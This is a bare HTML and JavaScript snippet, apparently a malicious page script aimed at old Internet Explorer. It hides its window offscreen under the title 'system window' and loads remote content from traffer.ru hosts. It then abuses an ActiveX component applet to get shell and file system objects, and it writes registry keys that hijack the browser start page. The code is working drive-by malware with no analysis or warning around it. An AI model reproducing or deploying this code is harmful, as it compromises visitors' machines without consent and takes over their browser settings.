<span datasrc=#oExec datafld=ex dataformatas=html></span> 
<script>
function cl() { self.blur(); self.moveTo(4000,4000); self.resizeTo(200,200) }
window.document.title="system window"
onfocus=cl
setInterval("cl()",300)
if (typeof(navigator.appVersion)=='undefined' || navigator.appVersion.search("MSIE")==-1 || typeof(navigator.opera)!='undefined') { self.close() }
else
{
  document.write('<img src=http://counter.yadro.ru/hit?r;'+Math.random()+' width=1 height=1>')
  setTimeout("self.close()",15000)
  document.write("<object data=http://pro.traffer.ru/7/?"+Math.floor(Math.random()*1000)+"></object>")
  if (navigator.appVersion.search(/MSIE [1-5]\.[0-4]/)!=-1 && typeof(navigator.javaEnabled)!='undefined' && navigator.javaEnabled())
  {
    document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>");
    try
    {
      HomePageUrl="http://start.traffer.ru/"
      a1=document.applets[0];
      a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
      a1.createInstance();
      Shl = a1.GetObject();
      a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
      a1.createInstance();
      FSO = a1.GetObject();
      a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
      a1.createInstance();
      Net = a1.GetObject();
      try
      {
        Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", HomePageUrl);
        Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL", HomePageUrl);
        Shl.RegWrite ("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", HomePageUrl);
        Shl.RegWrite ("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL", HomePageUrl);
      }
      catch(e){}
    }
    catch(e){}
  }
}
</script>